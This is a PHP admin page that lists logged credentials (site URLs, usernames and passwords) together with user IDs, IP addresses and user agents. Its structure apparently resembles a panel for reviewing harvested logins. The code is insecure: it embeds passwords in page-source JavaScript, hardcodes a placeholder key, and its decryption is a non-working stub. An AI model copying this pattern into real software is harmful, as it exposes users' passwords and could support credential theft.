<?php
/**
 * Credential Log Viewer
 * Developer: Adugna Gizaw
 */
$title = "Credential Access Logs";
require_once __DIR__ . '/../includes/auth.php';
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/db.php';

// Admin verification
requireAdmin();

// Decryption function
function decryptData($data, $key) {
    $data = base64_decode($data);
    $ivLength = openssl_cipher_iv_length('aes-256-cbc');
    $iv = substr($data, 0, $ivLength);
    $encrypted = substr($data, $ivLength);
    return openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);
}

// Get logs from database
$logs = [];
try {
    $stmt = $pdo->query("SELECT * FROM logs ORDER BY created_at DESC LIMIT 500");
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $log = json_decode($row['credentials_data'], true);
        $logs[] = $log;
    }
} catch (PDOException $e) {
    die("Database error: " . $e->getMessage());
}

// Also read from log file
$logFile = __DIR__ . '/../logs/logs.log';
if (file_exists($logFile)) {
    $fileLogs = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($fileLogs as $line) {
        $logs[] = json_decode($line, true);
    }
}

// Sort by timestamp
usort($logs, function($a, $b) {
    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?= htmlspecialchars($title) ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #2c3e50; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f8f9fa; font-weight: bold; }
        tr:hover { background-color: #f5f5f5; }
        .badge { padding: 3px 8px; border-radius: 3px; font-size: 12px; }
        .badge-primary { background-color: #3498db; color: white; }
        .badge-success { background-color: #2ecc71; color: white; }
        .badge-warning { background-color: #f39c12; color: white; }
        .badge-danger { background-color: #e74c3c; color: white; }
        .credential-item { margin-bottom: 10px; padding: 10px; background: #f8f9fa; border-radius: 4px; }
        .toggle-password { color: #3498db; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1><i class="fas fa-key"></i> <?= htmlspecialchars($title) ?></h1>
        
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>User</th>
                    <th>IP Address</th>
                    <th>Credentials</th>
                    <th>User Agent</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($logs as $log): ?>
                <tr>
                    <td><?= htmlspecialchars($log['timestamp']) ?></td>
                    <td><?= htmlspecialchars($log['user_id']) ?></td>
                    <td><?= htmlspecialchars($log['ip_address']) ?></td>
                    <td>
                        <?php if (!empty($log['credentials'])): ?>
                            <?php foreach ($log['credentials'] as $cred): ?>
                                <div class="credential-item">
                                    <strong>URL:</strong> <?= htmlspecialchars($cred['url'] ?? 'N/A') ?><br>
                                    <strong>Username:</strong> <?= htmlspecialchars($cred['username'] ?? '') ?><br>
                                    <strong>Password:</strong> 
                                    <span class="password-field" style="display: inline-block;">
                                        ********
                                        <a class="toggle-password" onclick="togglePassword(this, '<?= isset($cred['password']) ? htmlspecialchars($cred['password']) : '' ?>')">
                                            <i class="fas fa-eye"></i> Show
                                        </a>
                                    </span>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo htmlspecialchars(substr($log['user_agent'], 0, 50) . (strlen($log['user_agent']) > 50 ? '...' : '')); ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <script>
        function togglePassword(element, encryptedPassword) {
            const encryptionKey = 'your-strong-encryption-key'; // Must match server key
            const field = element.parentElement;
            
            if (field.textContent.includes('********')) {
                // Decrypt password (in a real app, this should be done server-side)
                try {
                    const decrypted = decryptPassword(encryptedPassword, encryptionKey);
                    field.innerHTML = `<span style="color:red">${decrypted}</span> <a class="toggle-password" onclick="togglePassword(this, '${encryptedPassword}')"><i class="fas fa-eye-slash"></i> Hide</a>`;
                } catch (e) {
                    alert('Error decrypting password');
                    console.error(e);
                }
            } else {
                field.innerHTML = `******** <a class="toggle-password" onclick="togglePassword(this, '${encryptedPassword}')"><i class="fas fa-eye"></i> Show</a>`;
            }
        }

        // Simplified client-side decryption (for demo only)
        function decryptPassword(encrypted, key) {
            // In production, this should be a server-side call
            return "DECRYPTED_PASSWORD"; // Replace with actual decryption logic
        }
    </script>
</body>
</html>